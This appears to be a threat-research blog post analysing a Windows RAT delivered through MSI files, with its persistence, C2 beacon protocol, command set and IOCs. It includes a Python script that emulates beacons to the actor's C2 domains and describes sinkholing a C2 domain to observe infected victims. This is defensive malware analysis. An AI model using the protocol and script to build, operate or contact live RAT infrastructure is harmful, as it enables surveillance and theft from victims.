---
title: "Attack on *stan: Reversing a Windows RAT"
classes: wide
header:
  teaser: /assets/images/afguzb/logo.png
ribbon: black
description: "Potential state-affiliated actor targets Afghanistani and Uzbek entities"
categories:
  - Threat Research
tags:
  - Threat Research
toc: true
---

# RATs in Kabul

This threat group leveraged the Android RAT, [XploitSPY](https://github.com/XploitWizer-Community/XploitSPY), which was configured to the C2 server `212.193.51[.]233` (`keyboard.fsocmicrsoft[.]com`). 

Whilst tracking this group, we identified a Windows-based RAT, delivered as a DLL, that communicated with the C2 server `server.fsocmicrsoft[.]com` (`181.174.164[.]193`). We identified additional similar samples uploaded to VirusTotal, attributed to the same threat group, that had Kazakhstan & Afghanstan lures and C2 domain names.

Like most RATs, this sample had the capability to run OS commands, download files, collect system metadata, enumerate drives, list files and create directories. All samples analysed beaconed to the C2 server every 5 seconds for updates or commands. . We believe this RAT and the corresponding infrastructure has gone unreported since 2023 and during this time, we have observed 4 variants of the RAT, all using the same C2 and beaconing protocol, although different variants of the RATs might expected different command formats from the C2. 

## Malware Delivery & Persistenece

The samples identified had all been delivered via `.msi` files, with different variants of the RAT being delivered using slightly different mechanisms. Regardless of the delivery method, both samples persist using the Run registry key in order to execute the DLL with `rundll32`.

### .msi -> .exe -> rundll32 Run key (Variant A)

Found on VirusTotal, the file [5573fa.msi](https://www.virustotal.com/gui/file/312c9c3241409ec4ce4a75fb0e207aeb7de8004d0096b24bc727aa723eb47c54) contains the files [SysDrive.exe](https://www.virustotal.com/gui/file/c164dcb81a6590b70ee6c0ab6a62da6e7a7c803bdc13a060beb84b33bd42c223) and [SysDriveLib.dll](https://www.virustotal.com/gui/file/0aa58a9fe4d78a20e7b4c77fc1df759953fbc2cff7403941aaa0e0fa136f9683). `SysDriveLib.dll` is the RAT. 

* `SysDrive.exe` (86d884956a0cab7f536b3b98edea0454)
* `SysDriveLib.dll` (9f660ee1b0e68a140a629b4e8842da06) - RAT payload

When the user double-clicks the DLL, the process `SysDrive.exe` will be ran. This binary is leveraged to copy the RAT DLL to `C:\Users\[user]\AppData\Roaming\SysDrive\SysDriveLib.dll` and establish persistence via the Run key `6`.

[![1](/assets/images/afguzb/B13.png)](/assets/images/afguzb/B13.png){: .align-center}

### .msi -> rundll32 Run key + Afghani decoy (Variant B)

Found on VirusTotal, the file [Instruction.msi](https://www.virustotal.com/gui/file/a7287c732c0559d49b9ad22f4fa843d3a837b33122e9195650e7f5331c27cf29/) contains the files [MY.DLL](https://www.virustotal.com/gui/file/5e60ccf20044148cbb58c063c245979a19db6be1cfed6a3a018c7430a0c75e44) and [MY.DOC](https://www.virustotal.com/gui/file/d9e99210f813b0b265c3a5aa236128fe5cab5eb56da9a9551cd3f849d7b9405d).

* `MY.DLL` (87343a65550b4f7a336b892cc9188e82) 
* `MY.DOC` (9b852f9a0fb735ca809f6895afc54dca)

Upon installation, the `MY.DLL` payload will be copied to `C:\ProgramData\NT\NT.dll` and the corresponding Run key `9` will be used to execute the DLL with `rundll32`:

[![1](/assets/images/afguzb/B14.png)](/assets/images/afguzb/B14.png){: .align-center}

The file `MY.DOC` is actually a PDF that contains a set of scanned official letter/memo from Afghanistan's (Islamic Emirate) Provincial authorities in Khost, about a public works / construction project for mosques:

[![1](/assets/images/afguzb/B15.png)](/assets/images/afguzb/B15.png){: .align-center}

### 

## Command & Control

The sample uses the Win32 API function `SetTimer` with `TimerFunc` used as the procedure in order to beacon every 5 seconds for new commands. 

[![1](/assets/images/afguzb/B1.png)](/assets/images/afguzb/B1.png){: .align-center}

The `TimerFunc` retrieves C2 commands via sending a POST request in the following format:

```
POST /as/include.php HTTP/1.1
Host:[HOST]
Content-Type:application/x-www-form-urlencoded
Content-Length:[LENGTH]
Connection: close


id=[DEVICE_ID]
```

The default response C2 server will make is just `()`. If commands have been sent, they will be contained within the brackets like `(info)` or `(exec c:\programdata\svchost.exe)` 

The RAT sends responses to commands as `POST` requests with an additional parameter, `msg`, gives a brief response message.  
```
POST /as/include.php HTTP/1.1
Host:[C2_HOST]
Content-Type:application/x-www-form-urlencoded
Content-Length:[LENGTH]
Connection: close

id=[DEVICE_ID]&msg=ok
```

[![1](/assets/images/afguzb/B2.png)](/assets/images/afguzb/B2.png){: .align-center}

> The device ID is constructed from the [VolumeSerialNumber](https://learn.microsoft.com/en-us/windows/win32/cimwin32prov/win32-logicaldisk) of the `C:/` drive. Specifically, the hex string of the first and last 16-bits of the serial number, joined with a dash `-`. For example, `a1b2-c3d4`.

We discovered *Variant A* by pivoting on the domain `fsocmicrsoft[.]com` in VirusTotal and found the DLL, `SysDriveLib.dll` (9f660ee1b0e68a140a629b4e8842da06) that communicated with `server.fsocmicrsoft[.]com` (currently pointing to `181.174.164[.]193`). This was uploaded to VirusTotal on `2023-09-03 08:19:31 UTC` and has a compilation timestamp of `2023-05-11 13:02:49 UTC`.

The C2 server for *Variant A*, on `181.174.164[.]193`, currently has another domain pointing to this same IP address, `dns.microbwt[.]team`: 

[![1](/assets/images/afguzb/B6.png)](/assets/images/afguzb/B6.png){: .align-center}

Pivoting on this new domain we can find another sample, `NT.dll` (87343a65550b4f7a336b892cc9188e82), which is part of *Variant B*. This was uploaded to VirusTotal on `2025-01-01 15:53:08 UTC` and has a compilation timestamp of `2024-11-28 10:30:00 UTC`.

| Compilation Time (UTC) | VirusTotal upload (UTC) | MD5 | C2 domain | C2 IP address (then) | HTTP Host header | Variant |
|----|----|----|----|----|----|----|
| 2023-03-15 10:00:22 | 2023-03-27 09:56:45 | 687442da7be02a2a72c36a9a1dbe9b97 | dns.freiesasien[.]com | 193.57.138[.]41 | dns.freiesasien[.]com | **D** |
| 2023-05-11 13:02:49 | 2023-09-03 08:19:31 | 9f660ee1b0e68a140a629b4e8842da06 | server.fsocmicrsoft[.]com | 190.14.37[.]114 | server.fsocmicrsoft[.]com | **A** |
| 2023-08-01 09:53:54 | 2023-09-06 11:16:55 | db942ba4cf38912a07eacc9e01d56574 | dns.freiesasien[.]com | 190.14.37[.]113 | dns.freiesasien[.]com | **C** |
| 2023-10-09 13:33:29 | 2023-10-26 10:06:02 | e36f27a13054f05da69761dc830b0db3 | dns.freiesasien[.]com | 190.14.37[.]113 | dns.freiesasien[.]com | **C** |
| 2024-05-06 11:47:54 | 2024-06-27 04:56:01 | 3e9a8d405f75d0ed8fc674bfaad1f87f | dns.freiesasien[.]com | 181.174.164[.]55 | dns.freiesasien[.]com | **B** |
| 2024-11-28 10:30:00 | 2025-01-01 15:53:08 | 87343a65550b4f7a336b892cc9188e82 | dsn.mamurigovaf[.]site | 181.174.164[.]111 | dns.microbwt[.]team | **B** |
| 2025-07-10 12:00:51 | 2025-07-25 17:30:39 | 76a7822a243f338bf3c5bc5c53997c12 | dsn.mamurigovaf[.]site  | 181.174.164[.]111 | dsn.mamurigovaf[.]site |**B** |


### Commands


| Command string (as sent by C2) | Variant A | Variant B | Variant C | Variant D | What it does                                                                                                    |
| ------------------------------ | --------: | --------: | --------: | --------: | ---------------------------------------------------------------------------------------------------------------------------- |
| `exec`                         |         ✅ |         ✅ |         ✅ |         ✅ | Run an executable on disk with `CreateProcessW`   |
| `disks`                        |         ✅ |         ✅ |         ✅ |         ✅ | Enumerate logical drives (C:, D:, etc) |
| `info`                         |         ✅ |         ✅ |         ✅ |         ✅ | Host profiling. **A/C/D** also enumerate running processes; **B** enumerates OS version only (no `EnumProcesses`). |
| `ctd`                          |         ✅ |         ✅ |         ✅ |         ✅ | Creates hidden directory |
| `upload`                       |         ✅ |         ✅ |         ✅ |         ✅ | Downloads file to disk using HTTP |
| `dir`                          |         ✅ |         ❌ |         ✅ |         ✅ | Directory/file listing with wildcards |
| `aaa`                          |         ❌ |         ✅ |         ❌ |         ❌ | Directory/file listing with wildcards |
| `dload`                        |         ✅ |         ❌ |         ❌ |         ❌ | Exfiltrates file from victim host to TA over HTTP POST |
| `download`                     |         ❌ |         ❌ |         ✅ |         ❌ | Exfiltrates file from victim host to TA over HTTP POST |
| `dl`                           |         ❌ |         ❌ |         ❌ |         ✅ | Exfiltrates file from victim host to TA over HTTP POST|


#### Command Execution

In all variants, if the command sent from C2 is `exec`, the RAT will run the executable passed as the parameter using `CreateProcessW`:

[![1](/assets/images/afguzb/B3.png)](/assets/images/afguzb/B3.png){: .align-center}

This function will return a boolean value representing whether execution was successful or not. If successful, the RAT will respond with the message `ok`, otherwise it will return `error`.

[![1](/assets/images/afguzb/B4.png)](/assets/images/afguzb/B4.png){: .align-center}

#### Disks

In all  variants, if the command sent to C2 is `disks`, the RAT will use the function `GetLocalDrives()` to return a listing of the single character drives that exist on the system.  

#### System Information

If the command received from the C2 contains the string `info`, all variants of the RAT will collect OS version information using `GetVersionExW`.

[![1](/assets/images/afguzb/B7.png)](/assets/images/afguzb/B7.png){: .align-center}

Noteably, in variants **A**, **C**, **D** sample also leveraged the Win32 API function `EnumProcesses` enumerate PIDs which are then used to get process names. These are seperated with HTML break's `<br>`.  
[![1](/assets/images/afguzb/B8.png)](/assets/images/afguzb/B8.png){: .align-center}

#### File System

In all variants, the command `ctd` allowed the operator to create a hidden directory using `CreateDirectoryA` and `SetFileAttributesW`, with the parameter `2` (`FILE_ATTRIBUTE_HIDDEN`):

[![1](/assets/images/afguzb/B12.png)](/assets/images/afguzb/B12.png){: .align-center}

In variant **B**, the command `aaa` allowed listing directories and searching for files using glob pattern using the functions `FindFirstFileA ` and `FindNexFileA`. The filenames are returned as seperated with `<br>` tags.

[![1](/assets/images/afguzb/B9.png)](/assets/images/afguzb/B9.png){: .align-center}

In variants **A**, **C**, **D**, the command `dir` also leveraged the above two Win32 API functions to list directories and search for files, also seperating with `<br>` tags, but also had the capability to mark directories in the response. *Variant A* can differentiate between file or directory when listing results, although variant **B** cannot.  

#### Upload / Download

In all variants, the `upload` command can be used to download a file from a remote URL to the victim host. It takes two arguments, a URL and output path. 

In variant **A** only, the command `dload` allows the operator to exfiltrate (or download) local files over HTTP POST request. In variants **C** & **D** this "download" functionaility is implemented by the commands `download` and `dl` respectively. Variant **B** has no correspodning "download" functionaility.

[![1](/assets/images/afguzb/B11.png)](/assets/images/afguzb/B11.png){: .align-center}

# Emulating client-side RAT

Taking lessons from Ms McGonagall's Transfiguration lessons we can turn a Python into a RAT. Using a simple Python script we can try emulate the beaconing procedure and see if we get any responses from C2: 

```python
import requests
import time 

beacon1 = "server.fsocmicrsoft.com"
beacon2 = "dsn.mamurigovaf.site"


def C2_req(host):

    url=f"http://{host}/as/include.php"

    headers = {
    "Content-Type": "application/x-www-form-urlencoded",
    "Host":f"{host}"
    }

    if host == "server.fsocmicrsoft.com":
        data = "1f23-7db4"                # randomly chosen device IDs
    elif host == "dsn.mamurigovaf.site":
        data = "75be-9ef2"

    r = requests.post(url, headers=headers, data=data, timeout=10)
    print(f"{host} Status:", r.status_code)
    print(f"{host} Body:", r.text)

while True:
    C2_req(beacon1)
    C2_req(beacon2)
    time.sleep(5)
```

# Ressurecting the C2 

## Sinkholing 

In this campaign, we observed the domain `dns.freiesasien[.]com` was used for C2 over HTTP (not encrypted). On December 28th we bought this domain and created an `A` record to point `dns.freisassien[.]com` to a server we own.

As a reminder, this malware beacons to `/as/include.php` on port 80. We setup a simple Python HTTP server and log requests to `/as/include.php`:

[![1](/assets/images/afguzb/B16.png)](/assets/images/afguzb/B16.png){: .align-center}

We can see multiple Kazakh IP addresses beaconing, still infected with the RAT. To make life easier we vibecoded a dashboard for tracking device IDs that are beaconing in:

[![1](/assets/images/afguzb/B20.png)](/assets/images/afguzb/B20.png){: .align-center}

# Reimplementing server-side components  

When victims beacon to `/as/include.php` for commands, the HTTP response will contain the command to be executed within brackets, like `(info)`.

## Self infection

We can run the malware found on VirusTotal, originally uploaded by Kazak IP addresses, on our VM and see the corresponding victim ID beacon in. 

[![1](/assets/images/afguzb/B18.png)](/assets/images/afguzb/B18.png){: .align-center}

Using a simple Python script, we run C2 commands on victim machines:

[![1](/assets/images/afguzb/B19.png)](/assets/images/afguzb/B19.png){: .align-center}

